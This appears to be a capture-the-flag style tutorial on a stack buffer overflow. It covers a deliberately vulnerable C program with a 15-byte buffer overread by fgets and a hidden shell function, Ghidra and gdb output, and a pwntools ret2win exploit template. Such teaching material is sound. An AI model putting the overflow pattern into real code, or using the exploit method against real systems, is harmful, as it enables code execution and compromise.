* Code:
```c
#include <stdio.h>
#include <stdlib.h>

void getName(){
	char name[15] = {0}; // !! Our buffer is only 15 characters... but: !!


	printf("What's your name? ");
	fgets(name, 100, stdin); // !! We are reading 100 characters despite only being able to store 15 characters !!
	printf("Cool name %s!", name);

}


void main(){
	getName();
}

void openShell(){
	system("/bin/sh");
}

```
* Decompiling in Ghidra, we get the following code for all the user defined functions:
```c
void getName(void){
  undefined8 local_17;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  
  local_17 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  printf("What\'s your name? ");
  fgets((char *)&local_17,100,stdin);
  printf("Cool name %s!",&local_17);
  return;
}

void main(void){
  getName();
  return;
}


void openShell(void){
  system("/bin/sh");
  return;
}
```
* Take note that the `getName` function is calling `fgets` and taking in 100 characters, while our buffer is only of size 15.
	* Technically, this limits how much we can overwrite the stack (while `gets` would let us write as much as we want, but 100 bytes should be enough for what we want.

* Stack:
```
---------------------------
|   main Return Address   | ↓️  
---------------------------
|     main Saved RBP      | ↓
---------------------------
| getName Return Address  | ↓
---------------------------
|   getName Saved RBP     | ↓
---------------------------
| getName 'name' Variable | ↓
---------------------------
| openShell Return Address| ↓
---------------------------
|   openShell Saved RBP   | ↓
---------------------------
```
* Notice the stack grow downwards
	* Every stack frame always starts with the return address, then the frame pointer
	* The return address is where the computer goes at the end of the function


* First, we want to be able to make the program crash. If we can do that, we can make it crash how we want to make the program do something malicious.

# Writing the exploit
### Boilerplate exploit code
```python3
from pwn import *
p = process('./program.elf')
e = ELF('./program.elf')

offset = rip - locationOfInput
addressToJumpTo = p64(e.symbols['openShell']) # p32 or p64 is based on if it is a 32 or 64 bit program. use `file` or `checksec` on binary to check

payload = b''
payload += b'A'*offset
payload += addressToJumpTo


p.sendline(payload)
p.interactive()
```

### Exploit process
* Preface: I highly suggest having [gef](https://gef.readthedocs.io/en/master/) installed for this. I will be using it.

1. Run `gdb buf1` to start the binary in a dynamic debugger
2. Run `disas main` to look at the main function to get the following output:
```bash
Dump of assembler code for function main:
   0x00000000004011a7 <+0>:	push   rbp
   0x00000000004011a8 <+1>:	mov    rbp,rsp
   0x00000000004011ab <+4>:	mov    eax,0x0
   0x00000000004011b0 <+9>:	call   0x401142 <getName>
   0x00000000004011b5 <+14>:	mov    eax,0x0
   0x00000000004011ba <+19>:	pop    rbp
   0x00000000004011bb <+20>:	ret    
End of assembler dump.

```
	* Here, we can see on offset <+9> from the main, there is a call to func `getName`
3. Disassemble `getName` with `disas getName` to get the following output:
```bash
Dump of assembler code for function getName:
   0x0000000000401142 <+0>:	push   rbp
   0x0000000000401143 <+1>:	mov    rbp,rsp
   0x0000000000401146 <+4>:	sub    rsp,0x10
   0x000000000040114a <+8>:	mov    QWORD PTR [rbp-0xf],0x0
   0x0000000000401152 <+16>:	mov    DWORD PTR [rbp-0x7],0x0
   0x0000000000401159 <+23>:	mov    WORD PTR [rbp-0x3],0x0
   0x000000000040115f <+29>:	mov    BYTE PTR [rbp-0x1],0x0
   0x0000000000401163 <+33>:	lea    rdi,[rip+0xe9a]        # 0x402004
   0x000000000040116a <+40>:	mov    eax,0x0
   0x000000000040116f <+45>:	call   0x401040 <printf@plt>
   0x0000000000401174 <+50>:	mov    rdx,QWORD PTR [rip+0x2ec5]        # 0x404040 <stdin@GLIBC_2.2.5>
   0x000000000040117b <+57>:	lea    rax,[rbp-0xf]
   0x000000000040117f <+61>:	mov    esi,0x64
   0x0000000000401184 <+66>:	mov    rdi,rax
   0x0000000000401187 <+69>:	call   0x401050 <fgets@plt>
   0x000000000040118c <+74>:	lea    rax,[rbp-0xf]
   0x0000000000401190 <+78>:	mov    rsi,rax
   0x0000000000401193 <+81>:	lea    rdi,[rip+0xe7d]        # 0x402017
   0x000000000040119a <+88>:	mov    eax,0x0
   0x000000000040119f <+93>:	call   0x401040 <printf@plt>
   0x00000000004011a4 <+98>:	nop
   0x00000000004011a5 <+99>:	leave  
   0x00000000004011a6 <+100>:	ret    
End of assembler dump.
```
4. Look for where we input into the buffer. We can see that it is calling `fgets` at offset <+69> from the main
5. We want to break immediately after the input to inspect the stack, so we can set a breakpoint at the offset right after the input with `b *getName + 74`
6. Run the binary in gdb with `r`
7. Input an 8-byte string. Typically we use all uppercase As, so I'm using `AAAAAAAA`
	* This should trigger our breakpoint
8. Now, we have to inspect the stack. We can first find the location of our input with `search-pattern AAAAAAAA`
	* This gives us the following:
```bash
[+] Searching 'AAAAAAAA' in memory
[+] In '[heap]'(0x405000-0x426000), permission=rw-
  0x4056b0 - 0x4056b8  →   "AAAAAAAA" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdfd1 - 0x7fffffffdfd9  →   "AAAAAAAA" 
```
* The start of the address of the string is `0x7fffffffdfd1` 


9. We can run `i f` to look at information on the current frame. We get the following:
```bash
Stack level 0, frame at 0x7fffffffdff0:
 rip = 0x40118c in getName; saved rip = 0x4011b5
 called by frame at 0x7fffffffe000
 Arglist at 0x7fffffffdfe0, args: 
 Locals at 0x7fffffffdfe0, Previous frame's sp is 0x7fffffffdff0
 Saved registers:
  rbp at 0x7fffffffdfe0, rip at 0x7fffffffdfe8
```
	* The rip is at `0x7fffffffdfe8`
10. We can get our offset by subtracting these: `0x7fffffffdfe8 - 0x7fffffffdfd1`, which is 23 bytes

